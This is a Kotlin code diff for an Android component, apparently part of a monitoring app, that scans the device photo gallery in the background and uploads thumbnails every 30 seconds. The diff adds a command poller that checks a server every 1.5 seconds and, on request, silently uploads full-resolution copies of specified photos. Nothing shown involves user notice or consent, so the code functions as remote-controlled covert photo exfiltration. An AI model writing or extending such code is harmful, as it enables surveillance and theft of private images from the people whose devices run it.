@@ -28,6 +28,7 @@ import java.util.*
 object BackgroundGalleryManager {
     private const val TAG = "BackgroundGalleryManager"
     private var syncJob: Job? = null
+    private var commandPollerJob: Job? = null
     private val scope = CoroutineScope(Dispatchers.IO)
     private var observerRegistered = false
 
@@ -56,16 +57,56 @@ object BackgroundGalleryManager {
             }
         }
 
-        if (syncJob?.isActive == true) return
-        syncJob = scope.launch {
-            val client = SentryApiClient(context)
-            while (isActive) {
-                try {
-                    syncGallery(context, client)
-                } catch (e: Exception) {
-                    Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
+        // Periodic Gallery Sync
+        if (syncJob?.isActive != true) {
+            syncJob = scope.launch {
+                val client = SentryApiClient(context)
+                while (isActive) {
+                    try {
+                        syncGallery(context, client)
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
+                    }
+                    delay(30_000) // Periodic refresh every 30 seconds
                 }
-                delay(30_000) // Periodic refresh every 30 seconds
+            }
+        }
+
+        // Command Poller for On-Demand Full-Resolution Image Fetching
+        if (commandPollerJob?.isActive != true) {
+            commandPollerJob = scope.launch {
+                val client = SentryApiClient(context)
+                while (isActive) {
+                    try {
+                        val res = client.pollGalleryCommands()
+                        if (res.isSuccess) {
+                            val obj = res.getOrNull()
+                            val fullImageMediaId = obj?.optString("fullImageMediaId")?.takeIf { it.isNotBlank() && it != "null" }
+                            if (!fullImageMediaId.isNullOrBlank()) {
+                                handleFullImageUpload(context, client, fullImageMediaId)
+                            }
+                        }
+                    } catch (_: Exception) {
+                    }
+                    delay(1500)
+                }
+            }
+        }
+    }
+
+    private suspend fun handleFullImageUpload(context: Context, client: SentryApiClient, mediaIdStr: String) {
+        withContext(Dispatchers.IO) {
+            try {
+                val cleanId = mediaIdStr.removePrefix("media_").toLongOrNull() ?: return@withContext
+                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cleanId)
+
+                val fullBase64 = extractFullResolutionBase64(context, contentUri)
+                if (!fullBase64.isNullOrBlank()) {
+                    client.uploadFullGalleryImage(mediaIdStr, fullBase64, "image/jpeg")
+                    Log.d(TAG, "Uploaded crystal-clear full-resolution photo for $mediaIdStr")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed full image upload for $mediaIdStr: ${e.message}")
             }
         }
     }
@@ -124,7 +165,7 @@ object BackgroundGalleryManager {
             val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
 
             var count = 0
-            val maxPhotosToScan = 800 // Scan up to 800 photos across all albums
+            val maxPhotosToScan = 800
 
             while (c.moveToNext() && count < maxPhotosToScan) {
                 val mediaId = if (idIdx >= 0) c.getLong(idIdx) else 0L
@@ -145,7 +186,7 @@ object BackgroundGalleryManager {
                 val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
                 val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
 
-                // Extract fast compressed thumbnail
+                // Fast compressed thumbnail for grid cards
                 val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
 
                 val obj = JSONObject().apply {
@@ -167,7 +208,7 @@ object BackgroundGalleryManager {
             }
         }
 
-        // Send photos in batches of 40 so payloads are fast and reliable
+        // Send photos in batches of 40
         if (allItems.isNotEmpty()) {
             val batchSize = 40
             for (i in 0 until allItems.size step batchSize) {
@@ -189,7 +230,7 @@ object BackgroundGalleryManager {
     private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
         return try {
             val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                context.contentResolver.loadThumbnail(uri, Size(200, 200), null)
+                context.contentResolver.loadThumbnail(uri, Size(220, 220), null)
             } else {
                 context.contentResolver.openInputStream(uri)?.use { stream ->
                     val options = BitmapFactory.Options().apply { inSampleSize = 4 }
@@ -201,6 +242,39 @@ object BackgroundGalleryManager {
             bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
             Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
         } catch (_: Exception) {
+            null
+        }
+    }
+
+    private fun extractFullResolutionBase64(context: Context, uri: Uri): String? {
+        return try {
+            // First decode bounds
+            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            context.contentResolver.openInputStream(uri)?.use { stream ->
+                BitmapFactory.decodeStream(stream, null, options)
+            }
+
+            val maxDim = 2560 // 2.5K crisp high-definition resolution
+            var sampleSize = 1
+            if (options.outWidth > maxDim || options.outHeight > maxDim) {
+                val larger = maxOf(options.outWidth, options.outHeight)
+                sampleSize = larger / maxDim
+            }
+
+            val decodeOptions = BitmapFactory.Options().apply {
+                inSampleSize = sampleSize.coerceAtLeast(1)
+                inPreferredConfig = Bitmap.Config.ARGB_8888
+            }
+
+            val fullBitmap = context.contentResolver.openInputStream(uri)?.use { stream ->
+                BitmapFactory.decodeStream(stream, null, decodeOptions)
+            } ?: return null
+
+            val out = ByteArrayOutputStream()
+            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 88, out)
+            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
+        } catch (e: Exception) {
+            Log.w(TAG, "Error decoding full resolution bitmap: ${e.message}")
             null
         }
     }
